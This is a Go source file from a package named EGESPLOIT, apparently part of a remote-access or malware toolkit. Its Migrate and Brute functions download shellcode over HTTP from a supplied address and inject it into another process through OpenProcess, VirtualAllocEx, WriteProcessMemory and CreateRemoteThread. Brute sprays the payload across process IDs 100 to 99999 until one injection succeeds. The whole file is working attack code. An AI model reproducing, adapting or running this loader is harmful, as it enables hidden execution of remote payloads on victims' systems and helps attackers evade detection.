package EGESPLOIT


import "unsafe"
import "net/http"
import "io/ioutil"
import "strconv"




func Migrate(Pid string, Address string) (bool, string){

  if Pid == "Brute" || Pid == "brute" || Pid == "BRUTE" {
    Status := Brute(Address)
    if Status == false {
      return false, "[!] Brute Migration Failed"
    }
  }

  Checksum := CalculateChecksum(10)
  Address += "/"
  Address += Checksum
  Address = ("http://" + Address)
  Response, err := http.Get(Address)
  if err != nil {
    return false, "[!] ERROR : Connection Attempt Failed."
  }
  Shellcode, _ := ioutil.ReadAll(Response.Body)

  L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  L_AddrPtr := (*[990000]byte)(unsafe.Pointer(L_Addr))
  for i := 0; i < len(Shellcode); i++ {
    L_AddrPtr[i] = Shellcode[i]
  }


  PID, _ := strconv.Atoi(Pid)

  var F int = 0
  Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(F), uintptr(PID))
  if Proc == 0 {
    return false, "[!] ERROR : Can't Open Remote Process."
  }
  R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  if R_Addr == 0 {
    return false, "[!] ERROR : Can't Allocate Memory On Remote Process."
  }
  WPMS, _, _ := WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))
  if WPMS == 0 {
    return false, "[!] ERROR : Can't Write To Remote Process."
  }


  CRTS, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
  if CRTS == 0 {
    return false, "[!] ERROR : Can't Create Remote Thread."
  }



  return true, ""
}

func Brute(Address string)  (bool){

  Checksum := CalculateChecksum(10)
  Address += "/"
  Address += Checksum
  Address = ("http://" + Address)
  Response, err := http.Get(Address)
  if err != nil {
    return false
  }
  Shellcode, _ := ioutil.ReadAll(Response.Body)

  L_Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  L_AddrPtr := (*[990000]byte)(unsafe.Pointer(L_Addr))
  for i := 0; i < len(Shellcode); i++ {
    L_AddrPtr[i] = Shellcode[i]
  }

  for i := 100; i < 99999; i++ {

    var F int = 0
    Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, uintptr(F), uintptr(i))

    R_Addr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)

    WriteProcessMemory.Call(Proc, R_Addr, L_Addr, uintptr(len(Shellcode)), uintptr(F))

    Status, _, _ := CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
    if Status != 0 {
      break
    }
  }
  return true
}
